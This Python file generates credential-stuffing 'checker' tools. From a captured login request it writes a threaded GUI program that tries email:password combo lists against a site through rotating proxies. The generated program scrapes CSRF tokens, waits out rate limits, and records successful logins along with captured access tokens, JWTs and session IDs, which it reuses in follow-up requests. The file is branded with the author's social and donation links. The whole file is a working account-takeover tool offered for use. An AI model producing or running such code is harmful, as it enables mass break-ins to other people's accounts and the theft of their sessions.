import json
import re
import urllib.parse
from utils.request_detector import detect_payload_type

SKIP_HEADERS = {
    "content-length", "transfer-encoding", "connection",
    "accept-encoding", "host",
}

CREDITS = [
    ("▶️ YouTube 🙏Subscribe🔔",   "https://www.youtube.com/@therealyashvirgaming-shorts?sub_confirmation=1"),
    ("𝖩𝗈𝗂𝗇 ➥ Telegram Group",     "https://t.me/OFFICIALYASHVIRGAMING_GROUPCHAT"),
    ("💲Donate via Paypal",         "https://www.paypal.com/paypalme/BibiMomeenZara"),
    ("ⓕ 𝗙𝗼𝗹𝗹𝗼𝘄 𝗺𝗲╰┈➤",            "https://www.facebook.com/yashvirgaming.info"),
    ("🌍 Discord Server",           "https://discord.gg/GnSCNvjBEG"),
    ("ⓕ Facebook Group",           "https://www.facebook.com/groups/openbullet2configs/"),
    ("🅾  𝐈𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦 ★",            "https://www.instagram.com/officialyashvirgaming/"),
    ("💬 Chat on Telegram 💎",      "https://t.me/therealyashvirgamingbot"),
    ("🎦 Video call📞",             "https://meet.google.com/and-pszu-gvc"),
    ("📧 Send Email 📩",            "mailto:Lucif3rHun@protonmail.com"),
]


def _clean_headers(headers):
    return {k: v for k, v in headers.items() if k.lower() not in SKIP_HEADERS}


def _get_content_type(headers):
    for k, v in headers.items():
        if k.lower() == "content-type":
            return v.lower()
    return ""


def _site_name(url):
    try:
        host = url.split("//", 1)[1].split("/")[0].lower()
        host = host.replace("www.", "").split(".")[0]
        return re.sub(r"[^a-z0-9_]", "_", host) or "target"
    except Exception:
        return "target"


def _is_graphql(payload):
    try:
        d = json.loads(payload)
        return isinstance(d, dict) and "query" in d and isinstance(d.get("query"), str)
    except Exception:
        return False


def _payload_repr(payload, ptype, email_key="email", pass_key="password"):
    """
    Build BASE_PAYLOAD with placeholder values for email/password fields.
    Other fields keep their original values from the captured request.
    """
    if ptype in ("json", "graphql"):
        try:
            obj = json.loads(payload)
            if isinstance(obj, dict):
                # Replace email/pass values with placeholders, keep everything else
                cleaned = {}
                for k, v in obj.items():
                    if k == email_key:
                        cleaned[k] = "{email}"
                    elif k == pass_key:
                        cleaned[k] = "{password}"
                    else:
                        cleaned[k] = v
                pretty = json.dumps(cleaned, indent=4, ensure_ascii=False)
            else:
                pretty = json.dumps(obj, indent=4, ensure_ascii=False)
            lines = pretty.splitlines()
            result = ["BASE_PAYLOAD = " + lines[0]]
            for l in lines[1:]:
                result.append(l)
            return result
        except Exception:
            return [f"BASE_PAYLOAD = {repr(payload)}"]
    elif ptype == "form":
        try:
            pairs = urllib.parse.parse_qsl(payload, keep_blank_values=True)
            if pairs:
                lines = ["BASE_PAYLOAD = {"]
                for k, v in pairs:
                    if k == email_key:
                        lines.append(f'    "{k}": "{{email}}",')
                    elif k == pass_key:
                        lines.append(f'    "{k}": "{{password}}",')
                    else:
                        lines.append(f'    "{k}": "{v}",')
                lines.append("}")
                return lines
        except Exception:
            pass
        return [f"BASE_PAYLOAD = {repr(payload)}"]
    return [f"BASE_PAYLOAD = {repr(payload)}"]


def _find_key(payload, ptype, candidates):
    if ptype in ("json", "graphql"):
        try:
            obj = json.loads(payload)
            if isinstance(obj, dict):
                for k in obj:
                    if k.lower() in candidates:
                        return k
        except Exception:
            pass
    if ptype == "form":
        try:
            for k, v in urllib.parse.parse_qsl(payload, keep_blank_values=True):
                if k.lower() in candidates:
                    return k
        except Exception:
            pass
    return candidates[0]


def _split_kws(value):
    if not value:
        return []
    return [k.strip() for k in value.replace(";", ",").split(",") if k.strip()]


def _q(s):
    return '"' + s.replace("\\", "\\\\").replace('"', '\\"') + '"'


def _detect_csrf(payload):
    csrf_names = ["csrf", "_token", "csrfmiddlewaretoken", "xsrf", "_xsrf",
                  "authenticity_token", "requestverificationtoken"]
    low = payload.lower()
    for name in csrf_names:
        if name in low:
            try:
                for k, v in urllib.parse.parse_qsl(payload, keep_blank_values=True):
                    if k.lower() == name:
                        return k
            except Exception:
                pass
            try:
                obj = json.loads(payload)
                if isinstance(obj, dict):
                    for k in obj:
                        if k.lower() == name:
                            return k
            except Exception:
                pass
            return name
    return None


def generate_python_code(req, settings=None):
    settings   = settings or {}
    method     = (req.get("method") or "GET").upper()
    url        = req.get("url") or ""
    headers    = _clean_headers(req.get("headers") or {})
    payload    = (req.get("payload") or "").strip()

    ptype      = detect_payload_type(payload)
    if payload and _is_graphql(payload):
        ptype  = "graphql"

    site       = _site_name(url)
    has_pl     = bool(payload)
    needs_json = ptype in ("json", "graphql")

    email_key  = _find_key(payload, ptype, ["email","username","user","login","account","mail"]) if has_pl else "email"
    pass_key   = _find_key(payload, ptype, ["password","pass","passwd","pwd","secret"]) if has_pl else "password"
    csrf_field = _detect_csrf(payload) if has_pl else None

    success_kws = _split_kws(settings.get("success_response") or settings.get("success", ""))
    failure_kws = _split_kws(settings.get("fail_response") or settings.get("failure", ""))
    retry_kws   = _split_kws(settings.get("retry", ""))

    captures    = settings.get("captures") or []
    followup    = settings.get("followup") or {}

    J  = "            "

    if has_pl:
        if ptype in ("json", "graphql"):
            inject = f'{J}payload = {{**BASE_PAYLOAD, "{email_key}": email, "{pass_key}": password}}'
            send   = f"{J}r = session.{method.lower()}(URL, headers=HEADERS, json=payload, proxies=proxies, timeout=20)"
        else:
            inject = f'{J}payload = {{**BASE_PAYLOAD, "{email_key}": email, "{pass_key}": password}}'
            send   = f"{J}r = session.{method.lower()}(URL, headers=HEADERS, data=payload, proxies=proxies, timeout=20)"
    else:
        inject = f"{J}pass"
        send   = f"{J}r = session.get(URL, headers=HEADERS, proxies=proxies, timeout=20)"

    I = "        "

    retry_block = [
        f"{I}if r.status_code == 429:",
        f'{I}    wait = int(r.headers.get("Retry-After", 15))',
        f'{I}    log(f"[RETRY] {{combo}} | rate limited {{wait}}s", "retry")',
        f"{I}    time.sleep(wait)",
        f"{I}    continue",
        f"{I}if r.status_code >= 500:",
        f'{I}    log(f"[RETRY] {{combo}} | server error {{r.status_code}}", "retry")',
        f"{I}    time.sleep(3)",
        f"{I}    continue",
    ]
    for kw in retry_kws:
        retry_block += [
            f"{I}if {_q(kw)} in text:",
            f'{I}    log(f"[RETRY] {{combo}} | {kw}", "retry")',
            f"{I}    time.sleep(5)",
            f"{I}    continue",
        ]

    result_block = []
    for kw in success_kws:
        result_block += [
            f"{I}if {_q(kw)} in text:",
            f'{I}    log(f"[HIT] {{combo}} | {kw} | {{r.status_code}}", "hit")',
            f"{I}    write_hit(combo)",
            f"{I}    return",
        ]
    for kw in failure_kws:
        result_block += [
            f"{I}if {_q(kw)} in text:",
            f'{I}    log(f"[BAD] {{combo}} | {kw} | {{r.status_code}}", "bad")',
            f"{I}    return",
        ]

    result_block += [
        f"{I}_TKEYS = {{\"access_token\",\"id_token\",\"refresh_token\",\"token\",\"jwt\",\"api_key\",\"session_token\",\"bearer\",\"sessionid\",\"session_id\",\"user_id\"}}",
        f"{I}try:",
        f"{I}    _rj = r.json()",
        f"{I}    _found = {{k: str(v)[:80] for k, v in _rj.items() if k.lower() in _TKEYS}}",
        f"{I}    if _found:",
        f"{I}        _hits = list(_found.items())[:3]",
        f'{I}        _msg = " | ".join(f"{{k}}={{str(v)[:24]}}..." if len(str(v))>24 else f"{{k}}={{v}}" for k,v in _hits)',
        f'{I}        log(f"[HIT] {{combo}} | {{_msg}} | {{r.status_code}}", "hit")',
        f'{I}        write_hit(f"{{combo}} | {{_msg}}")',
        f"{I}        return",
        f"{I}except Exception:",
        f"{I}    pass",
    ]

    if not success_kws:
        result_block += [
            f"{I}if r.status_code == 200:",
            f'{I}    log(f"[HIT?] {{combo}} | 200 — verify manually", "hit")',
            f"{I}    write_hit(combo)",
            f"{I}else:",
            f'{I}    log(f"[BAD] {{combo}} | {{r.status_code}}", "bad")',
        ]
    else:
        result_block.append(f'{I}log(f"[BAD] {{combo}} | {{r.status_code}}", "bad")')

    # Build follow-up lines and append inside the try block (same 8-space indent level)
    if followup and followup.get("url"):
        fu_method  = followup.get("method", "GET").lower()
        fu_url     = followup.get("url", "")
        fu_inject  = followup.get("inject", "auth Bearer header")
        fu_from    = re.sub(r"[^a-zA-Z0-9_]", "_", followup.get("from_var", "token")) or "token"

        if "Bearer" in fu_inject:
            h_val = f'"Authorization": f"Bearer {{{fu_from}}}"'
        elif "Token" in fu_inject:
            h_val = f'"Authorization": f"Token {{{fu_from}}}"'
        elif "x-auth-token" in fu_inject:
            h_val = f'"X-Auth-Token": {fu_from}'
        elif "x-api-key" in fu_inject:
            h_val = f'"X-Api-Key": {fu_from}'
        elif "cookie" in fu_inject:
            h_val = f'"Cookie": f"token={{{fu_from}}}"'
        else:
            h_val = f'"Authorization": f"Bearer {{{fu_from}}}"'

        result_block += [
            "",
            f"{I}if {fu_from}:",
            f'{I}    _fu_h = {{**HEADERS, {h_val}}}',
            f'{I}    try:',
            f'{I}        _fu_r = session.{fu_method}({repr(fu_url)}, headers=_fu_h, proxies=proxies, timeout=20)',
            f'{I}        log(f"[FOLLOWUP] {{combo}} | {fu_url[:50]} → {{_fu_r.status_code}}", "info")',
            f'{I}        write_hit(f"{{combo}} | followup={{_fu_r.status_code}} | {{_fu_r.text[:80]}}")',
            f'{I}    except Exception as _fex:',
            f'{I}        log(f"[FOLLOWUP ERR] {{combo}} | {{_fex}}", "error")',
        ]


    def _capture_block_for(cap, I):
        """Generate extraction lines for one capture definition."""
        name  = re.sub(r"[^a-zA-Z0-9_]", "_", cap["name"]) or "cap"
        mode  = cap["mode"]
        v1    = cap["val1"]
        v2    = cap.get("val2", "")
        lines = []
        if mode == "json":
            lines = [
                f"{I}try:",
                f"{I}    _d = r.json()",
                f'{I}    {name} = _find(_d, "{v1}")',
                f'{I}    if {name}: log(f"[capture] {name} = {{str({name})[:60]}}", "info")',
                f"{I}except Exception as _e: log(f'[capture err] {name}: {{_e}}', 'error')",
            ]
        elif mode == "lr":
            lines = [
                f"{I}try:",
                f'{I}    _li = text.find({repr(v1)})',
                f"{I}    if _li != -1:",
                f'{I}        _li += len({repr(v1)})',
                f'{I}        _ri = text.find({repr(v2)}, _li)',
                f"{I}        {name} = text[_li:_ri] if _ri != -1 else None",
                f'{I}    else: {name} = None',
                f'{I}    if {name}: log(f"[capture] {name} = {{{name}[:60]}}", "info")',
                f"{I}except Exception as _e: log(f'[capture err] {name}: {{_e}}', 'error')",
            ]
        elif mode == "regex":
            lines = [
                f"{I}try:",
                f'{I}    _m = re.search(r{repr(v1)}, text, re.S)',
                f"{I}    {name} = _m.group(1) if _m and _m.groups() else (_m.group(0) if _m else None)",
                f'{I}    if {name}: log(f"[capture] {name} = {{{name}[:60]}}", "info")',
                f"{I}except Exception as _e: log(f'[capture err] {name}: {{_e}}', 'error')",
            ]
        elif mode == "css":
            attr_part = f'_el.get({repr(v2)}) if _el else None' if v2 else '_el.get_text(strip=True) if _el else None'
            lines = [
                f"{I}try:",
                f'{I}    from bs4 import BeautifulSoup',
                f'{I}    _soup = BeautifulSoup(text, "html.parser")',
                f'{I}    _el = _soup.select_one({repr(v1)})',
                f'{I}    {name} = {attr_part}',
                f'{I}    if {name}: log(f"[capture] {name} = {{{name}[:60]}}", "info")',
                f"{I}except Exception as _e: log(f'[capture err] {name}: {{_e}}', 'error')",
            ]
        elif mode == "xpath":
            lines = [
                f"{I}try:",
                f'{I}    from lxml import etree',
                f'{I}    _tree = etree.fromstring(text.encode(), etree.HTMLParser())',
                f'{I}    _res = _tree.xpath({repr(v1)})',
                f'{I}    {name} = str(_res[0]) if _res else None',
                f'{I}    if {name}: log(f"[capture] {name} = {{{name}[:60]}}", "info")',
                f"{I}except Exception as _e: log(f'[capture err] {name}: {{_e}}', 'error')",
            ]
        elif mode == "jsonpath":
            lines = [
                f"{I}try:",
                f'{I}    from jsonpath_ng import parse as jp_parse',
                f'{I}    _expr = jp_parse({repr(v1)})',
                f'{I}    _matches = [m.value for m in _expr.find(r.json())]',
                f'{I}    {name} = str(_matches[0]) if _matches else None',
                f'{I}    if {name}: log(f"[capture] {name} = {{{name}[:60]}}", "info")',
                f"{I}except Exception as _e: log(f'[capture err] {name}: {{_e}}', 'error')",
            ]
        return lines

    parse_block = []
    for cap in captures:
        if cap.get("val1"):
            parse_block += _capture_block_for(cap, I)
            parse_block.append("")


    csrf_func = ""
    if csrf_field:
        cf = csrf_field
        csrf_func = f"""
def fetch_csrf(session, proxies):
    try:
        r0 = session.get(URL, headers=HEADERS, proxies=proxies, timeout=15)
        for pat in [
            r'name=["\\']{cf}["\\'\\s]+value=["\\'"]([^\\"\']+)["\\'"]',
            r'value=["\\'"]([^\\"\']+)["\\'"]\\s+name=["\\']{cf}["\\'"]',
            r'["\\']{cf}["\\'"]\\s*:\\s*["\\'"]([^\\"\']+)["\\'"]',
        ]:
            m = re.search(pat, r0.text, re.I)
            if m:
                return m.group(1)
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(r0.text, "html.parser")
            el = soup.find("input", {{"name": "{cf}"}})
            if el:
                return el.get("value", "")
        except Exception:
            pass
    except Exception:
        pass
    return ""
"""

    L = []

    L.append('"""')
    L.append("Coded By Yashvir Gaming \U0001f525 @therealyashvirgaming \U0001f525")
    L.append(f"URL    : {url}")
    L.append(f"Method : {method}   |   Payload: {ptype}")
    L.append('"""')
    L.append("")
    L.append("import customtkinter as ctk")
    L.append("import tkinter as tk")
    L.append("from tkinter import filedialog")
    L.append("import threading")
    L.append("import requests")
    L.append("import re")
    L.append("import time")
    L.append("import queue")
    L.append("import os")
    L.append("import webbrowser")
    if needs_json:
        L.append("import json")
    L.append("from datetime import datetime")
    L.append("")
    L.append('ctk.set_appearance_mode("dark")')
    L.append('ctk.set_default_color_theme("dark-blue")')
    L.append("")
    L.append('BG     = "#050508"')
    L.append('PANEL  = "#0d0d14"')
    L.append('BORDER = "#1a1a2e"')
    L.append('NEON   = "#00fff7"')
    L.append('RED    = "#ff003c"')
    L.append('PINK   = "#ff2d78"')
    L.append('PURPLE = "#7b2fff"')
    L.append('YELLOW = "#ffe600"')
    L.append('DIM    = "#3a3a5c"')
    L.append('WHITE  = "#e8e8ff"')
    L.append("")
    L.append(f'URL = "{url}"')
    L.append("")
    L.append("HEADERS = {")
    for k, v in headers.items():
        L.append(f"    {repr(k)}: {repr(v)},")
    L.append("}")
    L.append("")
    if has_pl:
        L.extend(_payload_repr(payload, ptype, email_key, pass_key))
        L.append("")
    if csrf_func:
        L.extend(csrf_func.strip().splitlines())
        L.append("")
    L.append("stop_event = threading.Event()")
    L.append("lock       = threading.Lock()")
    L.append('stats      = {"total": 0, "hits": 0, "bad": 0, "retries": 0, "errors": 0}')
    L.append("hits_file  = f\"hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt\"")
    L.append("")
    L.append("def write_hit(combo):")
    L.append('    with open(hits_file, "a", encoding="utf-8") as f:')
    L.append('        f.write(combo + "\\n")')
    L.append("")
    L.append("def parse_proxy(raw):")
    L.append("    raw = raw.strip()")
    L.append("    if not raw: return None")
    L.append("    p = raw.split(':')")
    L.append("    if len(p) == 2:   pu = f'http://{p[0]}:{p[1]}'")
    L.append("    elif len(p) == 4: pu = f'http://{p[2]}:{p[3]}@{p[0]}:{p[1]}'")
    L.append("    else: return None")
    L.append('    return {"http": pu, "https": pu}')
    L.append("")
    L.append("def worker(combo, proxy_raw, log):")
    L.append("    if stop_event.is_set(): return")
    L.append("    email, _, password = combo.partition(':')")
    L.append("    if not email or not password: return")
    L.append("    proxies = parse_proxy(proxy_raw)")
    L.append("    session = requests.Session()")
    L.append("    def _find(o, k):")
    L.append("        if isinstance(o, dict):")
    L.append("            if k in o: return o[k]")
    L.append("            for _v in o.values():")
    L.append("                _r2 = _find(_v, k)")
    L.append("                if _r2 is not None: return _r2")
    L.append("        elif isinstance(o, list):")
    L.append("            for _i in o:")
    L.append("                _r2 = _find(_i, k)")
    L.append("                if _r2 is not None: return _r2")
    L.append("        return None")
    L.append("")
    if csrf_field:
        L.append("    csrf_val = fetch_csrf(session, proxies)")
    L.append("    for attempt in range(1, 4):")
    L.append("        if stop_event.is_set(): return")
    L.append("        try:")
    L.append(inject)
    if csrf_field:
        L.append(f'            payload["{csrf_field}"] = csrf_val')
    L.append(send)
    L.append("            text   = r.text")
    L.append("            status = r.status_code")
    L.append("")
    for line in retry_block:
        L.append("    " + line)
    L.append("")
    for line in parse_block:
        L.append("    " + line)
    if parse_block:
        L.append("")
    for line in result_block:
        L.append("    " + line)
    L.append("")
    L.append("            break")
    L.append("")
    L.append("        except requests.exceptions.Timeout:")
    L.append('            log(f"[ERR] {combo} | Timeout #{attempt}", "error")')
    L.append("            with lock: stats['errors'] += 1")
    L.append("            time.sleep(2)")
    L.append("        except requests.exceptions.ProxyError:")
    L.append('            log(f"[ERR] {combo} | Proxy dead", "error")')
    L.append("            break")
    L.append("        except Exception as e:")
    L.append('            log(f"[ERR] {combo} | {e}", "error")')
    L.append("            time.sleep(2)")
    L.append("")

    L.append("CREDITS = [")
    for label, link in CREDITS:
        L.append(f"    ({repr(label)}, {repr(link)}),")
    L.append("]")
    L.append("")

    L.append("class CheckerApp:")
    L.append("    def __init__(self, root):")
    L.append("        self.root     = root")
    L.append(f'        self.root.title("{site.upper()} Checker  |  Coded By Yashvir Gaming")')
    L.append('        self.root.geometry("1100x820")')
    L.append("        self.root.configure(fg_color=BG)")
    L.append("        self.root.resizable(True, True)")
    L.append("        self.combos      = []")
    L.append("        self.proxies     = []")
    L.append("        self._threads    = []")
    L.append("        self._combo_q    = None")
    L.append("        self._proxy_idx  = 0")
    L.append("        self._running    = False")
    L.append("        self._pulse      = 0")
    L.append("        self._cpm_counter = 0")
    L.append("        self._cpm_ts     = time.time()")
    L.append("        self._build_ui()")
    L.append("        self._animate_pulse()")
    L.append("")
    L.append("    def _build_ui(self):")
    L.append("        title_bar = ctk.CTkFrame(self.root, fg_color=PANEL, height=56)")
    L.append("        title_bar.pack(fill='x')")
    L.append(f'        ctk.CTkLabel(title_bar, text="⬡  {site.upper()} CHECKER — Coded By Yashvir Gaming",')
    L.append('            font=("Consolas", 20, "bold"), text_color=NEON).pack(side="left", padx=20, pady=10)')
    L.append('        self.pulse_lbl = ctk.CTkLabel(title_bar, text="◉ IDLE", font=("Consolas", 13), text_color=DIM)')
    L.append('        self.pulse_lbl.pack(side="right", padx=20)')
    L.append("")
    L.append('        body = ctk.CTkFrame(self.root, fg_color=BG)')
    L.append('        body.pack(fill="both", expand=True, padx=10, pady=6)')
    L.append("        body.columnconfigure(0, weight=0)")
    L.append("        body.columnconfigure(1, weight=1)")
    L.append("        body.rowconfigure(0, weight=1)")
    L.append("")
    L.append("        left = ctk.CTkFrame(body, fg_color=PANEL, width=300, corner_radius=12)")
    L.append('        left.grid(row=0, column=0, sticky="nsew", padx=(0,6))')
    L.append("        left.pack_propagate(False)")
    L.append("")
    L.append("        def section_label(parent, text):")
    L.append('            ctk.CTkLabel(parent, text=text, font=("Consolas",11,"bold"),')
    L.append('                text_color=PURPLE).pack(anchor="w", padx=14, pady=(14,2))')
    L.append("")
    L.append('        section_label(left, "▸  COMBO LIST  (email:pass)")')
    L.append('        cr = ctk.CTkFrame(left, fg_color="transparent")')
    L.append('        cr.pack(fill="x", padx=10)')
    L.append('        self.combo_path = ctk.CTkEntry(cr, placeholder_text="combo.txt",')
    L.append('            fg_color=BORDER, border_color=PURPLE, text_color=WHITE, width=180)')
    L.append('        self.combo_path.pack(side="left", padx=(0,6))')
    L.append('        ctk.CTkButton(cr, text="Browse", width=80, fg_color=PURPLE,')
    L.append('            hover_color=PINK, text_color=BG, command=self._load_combos).pack(side="left")')
    L.append('        self.combo_count = ctk.CTkLabel(left, text="0 combos", font=("Consolas",10), text_color=DIM)')
    L.append('        self.combo_count.pack(anchor="w", padx=14)')
    L.append("")
    L.append('        section_label(left, "▸  PROXIES  (ip:port or ip:port:u:p)")')
    L.append('        pr = ctk.CTkFrame(left, fg_color="transparent")')
    L.append('        pr.pack(fill="x", padx=10)')
    L.append('        self.proxy_path = ctk.CTkEntry(pr, placeholder_text="proxies.txt",')
    L.append('            fg_color=BORDER, border_color=DIM, text_color=WHITE, width=180)')
    L.append('        self.proxy_path.pack(side="left", padx=(0,6))')
    L.append('        ctk.CTkButton(pr, text="Browse", width=80, fg_color=DIM,')
    L.append('            hover_color=PURPLE, text_color=WHITE, command=self._load_proxies).pack(side="left")')
    L.append('        self.proxy_count = ctk.CTkLabel(left, text="No proxies (direct)", font=("Consolas",10), text_color=DIM)')
    L.append('        self.proxy_count.pack(anchor="w", padx=14)')
    L.append("")
    L.append('        section_label(left, "▸  THREADS  (1 – 200)")')
    L.append('        self.thread_slider = ctk.CTkSlider(left, from_=1, to=200, number_of_steps=199,')
    L.append('            progress_color=NEON, button_color=PINK, button_hover_color=RED, command=self._on_slider)')
    L.append("        self.thread_slider.set(10)")
    L.append('        self.thread_slider.pack(fill="x", padx=14, pady=(0,2))')
    L.append('        self.thread_val_lbl = ctk.CTkLabel(left, text="Threads: 10", font=("Consolas",11), text_color=NEON)')
    L.append('        self.thread_val_lbl.pack(anchor="w", padx=14)')
    L.append("")
    L.append('        section_label(left, "▸  STATS")')
    L.append('        sg = ctk.CTkFrame(left, fg_color=BORDER, corner_radius=8)')
    L.append('        sg.pack(fill="x", padx=10, pady=(0,8))')
    L.append("        def stat_row(p, label, attr, color):")
    L.append('            f = ctk.CTkFrame(p, fg_color="transparent")')
    L.append('            f.pack(fill="x", padx=10, pady=2)')
    L.append('            ctk.CTkLabel(f, text=label, font=("Consolas",10), text_color=DIM, width=80, anchor="w").pack(side="left")')
    L.append('            lbl = ctk.CTkLabel(f, text="0", font=("Consolas",12,"bold"), text_color=color, width=60, anchor="e")')
    L.append('            lbl.pack(side="right")')
    L.append("            setattr(self, attr, lbl)")
    L.append('        stat_row(sg, "Total",   "lbl_total",   WHITE)')
    L.append('        stat_row(sg, "Hits",    "lbl_hits",    NEON)')
    L.append('        stat_row(sg, "Bad",     "lbl_bad",     RED)')
    L.append('        stat_row(sg, "Retries", "lbl_retries", YELLOW)')
    L.append('        stat_row(sg, "Errors",  "lbl_errors",  PINK)')
    L.append('        stat_row(sg, "CPM",     "lbl_cpm",     PURPLE)')
    L.append("")
    L.append('        self.progress = ctk.CTkProgressBar(left, progress_color=NEON, fg_color=BORDER, corner_radius=4)')
    L.append("        self.progress.set(0)")
    L.append('        self.progress.pack(fill="x", padx=10, pady=(4,0))')
    L.append('        self.progress_lbl = ctk.CTkLabel(left, text="0 / 0", font=("Consolas",10), text_color=DIM)')
    L.append('        self.progress_lbl.pack(anchor="w", padx=14)')
    L.append("")
    L.append('        br = ctk.CTkFrame(left, fg_color="transparent")')
    L.append('        br.pack(fill="x", padx=10, pady=12)')
    L.append('        self.start_btn = ctk.CTkButton(br, text="▶  START", font=("Consolas",13,"bold"),')
    L.append('            fg_color=NEON, hover_color=PURPLE, text_color=BG, corner_radius=8, height=38, command=self._start)')
    L.append('        self.start_btn.pack(side="left", expand=True, fill="x", padx=(0,4))')
    L.append('        self.stop_btn = ctk.CTkButton(br, text="■  STOP", font=("Consolas",13,"bold"),')
    L.append('            fg_color=RED, hover_color=PINK, text_color=WHITE, corner_radius=8, height=38, command=self._stop)')
    L.append('        self.stop_btn.pack(side="left", expand=True, fill="x", padx=(4,0))')
    L.append("")
    L.append("        right = ctk.CTkFrame(body, fg_color=PANEL, corner_radius=12)")
    L.append('        right.grid(row=0, column=1, sticky="nsew")')
    L.append('        ot = ctk.CTkFrame(right, fg_color="transparent", height=36)')
    L.append('        ot.pack(fill="x", padx=10, pady=(8,0))')
    L.append('        ctk.CTkLabel(ot, text="OUTPUT LOG", font=("Consolas",12,"bold"), text_color=NEON).pack(side="left")')
    L.append('        ctk.CTkButton(ot, text="Save Log", width=80, height=24, fg_color=BORDER,')
    L.append('            hover_color=PURPLE, text_color=WHITE, command=self._save_log).pack(side="right")')
    L.append('        ctk.CTkButton(ot, text="Clear", width=60, height=24, fg_color=BORDER,')
    L.append('            hover_color=DIM, text_color=WHITE, command=self._clear_output).pack(side="right", padx=(0,6))')
    L.append('        self.output_box = ctk.CTkTextbox(right, fg_color="#060610", text_color=WHITE,')
    L.append('            font=("Consolas",11), wrap="none", corner_radius=8)')
    L.append('        self.output_box.pack(fill="both", expand=True, padx=10, pady=8)')
    L.append("")
    L.append("        credits_bar = ctk.CTkFrame(self.root, fg_color='#08080f', height=36)")
    L.append("        credits_bar.pack(fill='x', side='bottom')")
    L.append("        for label, link in CREDITS:")
    L.append("            ctk.CTkButton(credits_bar, text=label, width=110, height=26,")
    L.append("                fg_color='#0d0d1a', hover_color=PURPLE, text_color=NEON,")
    L.append("                font=('Consolas', 9),")
    L.append("                command=lambda l=link: webbrowser.open(l)")
    L.append("            ).pack(side='left', padx=3, pady=4)")
    L.append("")
    L.append("    def _on_slider(self, val):")
    L.append("        self.thread_val_lbl.configure(text=f'Threads: {int(val)}')")
    L.append("")
    L.append("    def _animate_pulse(self):")
    L.append("        if self._running:")
    L.append("            frames = ['◉ RUNNING ▌','◉ RUNNING ▐','◉ RUNNING █','◉ RUNNING ▐']")
    L.append("            self.pulse_lbl.configure(text=frames[self._pulse % 4], text_color=NEON)")
    L.append("            self._pulse += 1")
    L.append("        else:")
    L.append("            self.pulse_lbl.configure(text='◉ IDLE', text_color=DIM)")
    L.append("        self.root.after(400, self._animate_pulse)")
    L.append("")
    L.append("    def _load_combos(self):")
    L.append("        path = filedialog.askopenfilename(filetypes=[('Text','*.txt'),('All','*.*')])")
    L.append("        if not path: return")
    L.append("        with open(path, 'r', encoding='utf-8', errors='ignore') as f:")
    L.append("            lines = [l.strip() for l in f if ':' in l.strip()]")
    L.append("        self.combos = lines")
    L.append("        self.combo_path.delete(0, 'end')")
    L.append("        self.combo_path.insert(0, os.path.basename(path))")
    L.append("        self.combo_count.configure(text=f'{len(lines)} combos loaded')")
    L.append("        self.log(f'[+] {len(lines)} combos loaded', 'info')")
    L.append("")
    L.append("    def _load_proxies(self):")
    L.append("        path = filedialog.askopenfilename(filetypes=[('Text','*.txt'),('All','*.*')])")
    L.append("        if not path: return")
    L.append("        with open(path, 'r', encoding='utf-8', errors='ignore') as f:")
    L.append("            lines = [l.strip() for l in f if l.strip()]")
    L.append("        self.proxies = lines")
    L.append("        self.proxy_path.delete(0, 'end')")
    L.append("        self.proxy_path.insert(0, os.path.basename(path))")
    L.append("        self.proxy_count.configure(text=f'{len(lines)} proxies loaded')")
    L.append("        self.log(f'[+] {len(lines)} proxies loaded', 'info')")
    L.append("")
    L.append("    def _get_proxy(self):")
    L.append("        if not self.proxies: return ''")
    L.append("        with lock:")
    L.append("            p = self.proxies[self._proxy_idx % len(self.proxies)]")
    L.append("            self._proxy_idx += 1")
    L.append("        return p")
    L.append("")
    L.append("    def log(self, msg, kind='info'):")
    L.append("        ts   = datetime.now().strftime('%H:%M:%S')")
    L.append("        line = f'[{ts}] {msg}'")
    L.append("        def _insert():")
    L.append("            self.output_box.configure(state='normal')")
    L.append("            self.output_box.insert('end', line + '\\n')")
    L.append("            self.output_box.see('end')")
    L.append("            self.output_box.configure(state='disabled')")
    L.append("        self.root.after(0, _insert)")
    L.append("")
    L.append("    def _update_stats(self):")
    L.append("        if not self._running: return")
    L.append("        done    = stats['hits'] + stats['bad'] + stats['errors']")
    L.append("        total   = len(self.combos)")
    L.append("        pct     = done / total if total else 0")
    L.append("        elapsed = time.time() - self._cpm_ts")
    L.append("        cpm     = int(self._cpm_counter / elapsed * 60) if elapsed > 0 else 0")
    L.append("        def _upd():")
    L.append("            self.lbl_total.configure(text=str(stats['total']))")
    L.append("            self.lbl_hits.configure(text=str(stats['hits']))")
    L.append("            self.lbl_bad.configure(text=str(stats['bad']))")
    L.append("            self.lbl_retries.configure(text=str(stats['retries']))")
    L.append("            self.lbl_errors.configure(text=str(stats['errors']))")
    L.append("            self.lbl_cpm.configure(text=str(cpm))")
    L.append("            self.progress.set(pct)")
    L.append("            self.progress_lbl.configure(text=f'{done} / {total}')")
    L.append("        self.root.after(0, _upd)")
    L.append("        self.root.after(500, self._update_stats)")
    L.append("")
    L.append("    def _start(self):")
    L.append("        if self._running: return")
    L.append("        if not self.combos:")
    L.append("            self.log('[!] Load a combo file first.', 'error'); return")
    L.append("        stop_event.clear()")
    L.append("        for k in stats: stats[k] = 0")
    L.append("        self._cpm_counter = 0")
    L.append("        self._cpm_ts      = time.time()")
    L.append("        self._running     = True")
    L.append("        self._combo_q     = queue.Queue()")
    L.append("        for c in self.combos: self._combo_q.put(c)")
    L.append("        n = int(self.thread_slider.get())")
    L.append("        self.log(f'[START] {len(self.combos)} combos | {n} threads | {len(self.proxies)} proxies', 'info')")
    L.append("        self.start_btn.configure(fg_color=DIM, state='disabled')")
    L.append("        self._update_stats()")
    L.append("        for _ in range(n):")
    L.append("            t = threading.Thread(target=self._thread_runner, daemon=True)")
    L.append("            t.start(); self._threads.append(t)")
    L.append("")
    L.append("    def _thread_runner(self):")
    L.append("        while not stop_event.is_set():")
    L.append("            try:")
    L.append("                combo = self._combo_q.get_nowait()")
    L.append("            except Exception:")
    L.append("                break")
    L.append("            with lock:")
    L.append("                stats['total'] += 1")
    L.append("                self._cpm_counter += 1")
    L.append("            worker(combo, self._get_proxy(), self.log)")
    L.append("            self._combo_q.task_done()")
    L.append("        self.root.after(0, self._on_done)")
    L.append("")
    L.append("    def _stop(self):")
    L.append("        stop_event.set()")
    L.append("        self.log('[STOP] Stopping...', 'error')")
    L.append("")
    L.append("    def _on_done(self):")
    L.append("        self._running = False")
    L.append("        self.start_btn.configure(fg_color=NEON, state='normal')")
